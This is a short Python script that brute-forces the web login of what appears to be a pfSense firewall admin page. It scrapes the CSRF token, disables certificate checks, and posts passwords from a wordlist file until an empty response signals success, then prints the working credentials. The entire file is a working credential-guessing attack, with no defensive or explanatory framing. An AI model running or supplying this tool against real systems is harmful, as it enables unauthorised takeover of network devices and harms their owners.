import sys
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

login = sys.argv[1]
pass_file = sys.argv[2]
url = 'https://{}/index.php'.format(sys.argv[3])

response = requests.get(url, verify=False).text

m = re.search('csrfMagicToken = "(.+?)"', response)
csrf = m.group(1)

with open(pass_file) as f:
    passes = f.read().split('\n')

success = False
for passw in passes:
    print 'Trying password: {}'.format(passw)
    response = requests.post(url, verify=False, allow_redirects=False, data={
        '__csrf_magic': csrf, 
        'usernamefld': login, 
        'passwordfld': passw, 
        'login': 'Sign+In'
    })

    if response.text == '':
        print 'Success!\nCredentials: {0}:{1}'.format(login, passw)
        success = True
        break

if not success:
    print 'Try with better password file'

